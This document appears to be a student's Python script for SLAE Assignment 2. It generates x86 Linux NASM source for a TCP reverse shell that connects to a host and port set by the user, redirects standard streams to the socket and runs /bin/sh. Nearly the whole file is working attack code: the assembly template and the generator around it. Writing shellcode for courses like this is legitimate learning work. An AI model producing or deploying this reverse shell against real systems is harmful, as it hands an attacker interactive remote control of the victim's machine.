# SLAE Assignment 2.
# reverse_shell_generator
# StudentID : SLAE-1133
# usage: python3 reverse_shell_generator.py --lport 1234 >> test_shell.nasm

import socket
import argparse


def ipaddress2dword(ipaddress):
    hex_str = socket.inet_aton(ipaddress).hex()
    str_dword = ""
    for i in range(0, len(hex_str), 2):
        temp = hex_str[i:i+2]
        str_dword = temp + str_dword

    return f"0x{str_dword}"


def get_reverse_shellcode(ipaddress, port):

    hex_ip = ipaddress2dword(ipaddress)
    hex_port = hex(socket.htons(port))
    shellcode = r"""
; Filename:  reverse_shell_tcp.nasm
; Author:    Ahmed Kasmani
; StudentID: SLAE-1133
; Purpose:   TCP Reverse Shell


global _start

section .text
_start:
    ; creating the socket
    xor ebx, ebx
    mov bl, 0x02

    xor ecx, ecx
    mov cl, 0x01

    xor edx, edx

    xor eax, eax
    mov ax, 0x167
    int 0x80

    ; connecting
    xor ebx, ebx
    mov ebx, eax

    push dword {}
    push word {}
    push word 0x02

    xor ecx, ecx
    mov ecx, esp

    xor edx, edx
    mov dl, 0x10

    xor eax, eax
    mov ax, 0x16A
    int 0x80

    ; dup2 3 times
    ; 1st time dup2 for STDIN_FILENO
    ; mov ebx, eax
    ; #define STDIN_FILENO	0
    xor ecx, ecx

    xor eax, eax
    mov al, 0x3F
    int 0x80


    ; 2nd time dup2 for STDOUT_FILENO
    mov cl, 0x1

    xor eax, eax
    mov al, 0x3F
    int 0x80


    ; 3rd time dup2 for STDERR_FILENO
    mov cl, 0x2

    xor eax, eax
    mov al, 0x3F
    int 0x80



    ; this is the execve part

    xor eax, eax
    xor ebx, ebx

    ; push 0x00000000 to stack
    push ebx
    ; mov the above 0 to edx, the last param of execve
    mov edx, esp

    ; push //bin/sh to the stack, moving it to ebx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp


    xor ecx, ecx
    push ecx
    push ebx
    mov ecx, esp


    mov al, 0xb
    int 0x80

    """.format(hex_ip,hex_port)

    return shellcode


parser = argparse.ArgumentParser(description='Generate Reverse shellcode for SLAE Assignment 2.')
parser.add_argument("-lport","--lport", type=int, default="443", help="Reverse Shell Port Number. Default value: 443")
parser.add_argument("-lhost","--lhost", type=str, default="127.0.0.1", help="Reverse Shell Host IPAddress. Default value: 127.0.0.1")
parser.add_argument("-file","--file", type=str, default="test_shell.nasm", help="Reverse shell nasm file to be generated.")
args = parser.parse_args()
port = args.lport
ipaddress = args.lhost
output_file = args.file

reverse_shellcode = get_reverse_shellcode(ipaddress, port)
# print(reverse_shellcode)

out_file= open(output_file, "w+")
out_file.write(reverse_shellcode)
out_file.close()

print(f"Reverse Shell Nasm file generate {output_file}")
